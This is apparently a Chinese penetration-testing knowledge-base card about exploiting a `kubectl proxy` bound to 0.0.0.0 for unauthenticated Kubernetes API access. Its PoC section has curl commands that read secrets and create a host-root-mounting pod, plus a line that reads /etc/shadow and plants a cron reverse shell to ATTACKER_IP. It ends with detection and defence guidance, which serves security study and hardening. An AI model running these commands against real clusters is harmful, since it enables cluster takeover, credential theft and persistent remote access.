---
id: cloud-k8s-kubectl-proxy-exposed-unauth-api
title: kubectl proxy 绑定 0.0.0.0 导致未授权 K8s API 访问与 Pod 创建
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-kubectl-proxy-exposed
tags:
- k8s
- kubernetes
- kubectl-proxy
- unauthorized
- api-server
- container-escape
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:10:38+08:00'
  notes: 已对照原文核对：kubectl proxy --address=0.0.0.0 --port=8080 利用本地kubeconfig凭证转发，curl /version、/api/v1/nodes、POST pods、kubectl -s ... exec 与原文一致。原文该节为配置风险推演，未给实测截图；卡内已将“需要运维实际启动不安全proxy”作为前提。原文未给受影响版本；PoC未本机执行；frontmatter无sources/source_url。
url: /docs/cloud/k8s/cloud-k8s-kubectl-proxy-exposed-unauth-api/
draft: false
kb_aliases:
- kubectl proxy 暴露
- --address=0.0.0.0
- --accept-hosts='.*'
- K8s 代理未授权
- proxy 8080
---

## 一句话结论

运维人员执行 `kubectl proxy --address=0.0.0.0 --port=8080 --accept-hosts='.*'` 时，代理会使用其本地 kubeconfig 凭证把外部请求转发到 API Server；攻击者无需认证即可通过代理读取集群信息、创建 Pod，进而挂载宿主机根目录逃逸。

## 原理

- `kubectl proxy` 在本地起一个 HTTP 代理，把请求转发到 API Server，并用本地 kubeconfig 自动完成认证。
- 默认监听 `127.0.0.1`，相对安全；若指定 `--address=0.0.0.0`，所有网卡可达；`--accept-hosts='.*'` 允许任意 Host 头访问；`--reject-methods=''` 允许 POST/PUT/DELETE 等修改操作。
- 外部攻击者访问 `http://TARGET:8080/api/v1/nodes` 等路径时，代理用自己的高权限凭证转发，等于绕过认证。
- 可读取 Node/Pod/Secret，也可 POST 创建带 `hostPath: /` 的 Pod，进入后写宿主机 crontab 或 `chroot` 逃逸。
- 该问题是运维配置错误，不是 K8s 漏洞；需要代理端口可达。

## 触发条件

- 目标机器上运行 `kubectl proxy` 且绑定 `0.0.0.0`/可达地址。
- `--accept-hosts` 允许攻击者 Host，`--reject-methods` 未限制 POST/PUT/PATCH/DELETE。
- 运行 proxy 的 kubeconfig 账号有读取/创建 Pod 等权限。
- 网络可达代理端口（常见 8001/8080）。

## 利用步骤

1. 扫描/访问 `http://TARGET:8080/version`，返回 K8s 版本 JSON 说明代理存活。
2. 读取节点：`curl http://TARGET:8080/api/v1/nodes`；读取 Pod/Secret。
3. 构造带 `hostPath: /` 的 Pod JSON，POST 到 `/api/v1/namespaces/default/pods`。
4. 用 `kubectl -s http://TARGET:8080 exec -it <pod> -- bash` 进入 Pod（若本地有 kubectl）。
5. 在 Pod 内写宿主机 crontab 或 `chroot /host` 逃逸。
6. 记录代理配置、权限与操作证据；清理 Pod。

## PoC

探测：

```bash
curl http://TARGET:8080/version
curl http://TARGET:8080/api/v1/nodes
curl http://TARGET:8080/api/v1/namespaces/kube-system/secrets
```

创建恶意 Pod：

```bash
POD_JSON='{
  "apiVersion":"v1","kind":"Pod",
  "metadata":{"name":"proxy-malicious-pod","namespace":"default"},
  "spec":{
    "containers":[{"name":"c","image":"nginx:alpine",
      "volumeMounts":[{"name":"host","mountPath":"/host"}]}],
    "volumes":[{"name":"host","hostPath":{"path":"/","type":"Directory"}}]
  }
}'
curl -X POST -H "Content-Type: application/json" -d "$POD_JSON" \
  http://TARGET:8080/api/v1/namespaces/default/pods
```

进入 Pod / 逃逸：

```bash
kubectl -s http://TARGET:8080 exec -it proxy-malicious-pod -n default -- bash
cd /host && cat etc/shadow
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/6677 0>&1' >> /host/etc/crontab
```

## 变体与关联

- 变体：`--accept-hosts` 限制 localhost 时，可尝试 Host 头伪造/SSRF 从本机访问；不一定成功。
- 变体：代理只读（`--reject-methods=POST,PUT,PATCH,DELETE`）时，仍可读取 Secret/Token，寻找其他入口。
- 变体：`kubectl proxy` 运行在 CI/运维跳板机上，kubeconfig 权限可能很高。
- 关联：[[cloud-k8s-kubeconfig-leak-cluster-takeover]]（kubeconfig 泄露）。
- 关联：[[cloud-k8s-k8s-apiserver-anonymous-access]]（API Server 未授权）。
- 关联：[[cloud-container-k8s-workload-config-escape]]（hostPath Pod 逃逸）。
- 注意：默认 `127.0.0.1` 的 proxy 不对外，不能直接利用；必须先确认绑定地址与可达性。

## 检测与防御

- 防御：不要用 `--address=0.0.0.0`；保持默认 `127.0.0.1`；必须远程时用 SSH 隧道/VPN，并限制 `--accept-hosts`。
- 防御：用 `--reject-methods='POST,PUT,PATCH,DELETE'` 只读；代理进程仅在需要时启动，用完即关。
- 防御：运行 proxy 的 kubeconfig 账号最小权限；不要把高权限 kubeconfig 放在运维跳板机。
- 检测：主机上出现 `kubectl proxy` 进程且监听 0.0.0.0；代理端口对外开放；通过代理的异常 API 请求（创建 Pod、读取 Secret）；`/version` 探测。
- 响应：终止 proxy、轮换 kubeconfig/Token、删除恶意 Pod、检查节点 crontab/SSH、审计 API 日志。
